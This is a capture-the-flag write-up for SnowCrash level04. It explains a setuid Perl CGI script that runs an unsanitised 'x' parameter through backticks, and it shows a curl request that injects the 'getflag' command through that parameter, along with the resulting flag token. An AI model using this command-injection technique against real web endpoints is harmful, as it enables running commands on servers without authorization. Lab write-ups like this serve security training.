How to find:

    level04@SnowCrash:~$ ls
    level04.pl

    -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl


A perl script:

    level04@SnowCrash:~$ cat level04.pl 
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    }
    x(param("x"));
    level04@SnowCrash:~$


                     
This program is executed from a web server hosted on local machine and reachable via the port 4747

CGI(Common Gateway Interface) is a protocol for executing scripts via web requests

print "Content-type: text/html\n\n"; 
Print the string when it's execute

Define function 'x'
Variable 'y' take the value of the variable passed as parameter
Print variable 'y' ('2>&1' is for error handling)

Call function 'x'


As the program is running in a server hosted in the VM we use curl and pass the command 'getflag'


    curl 'localhost:4747/level04.pl?x=`getflag`'

    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap




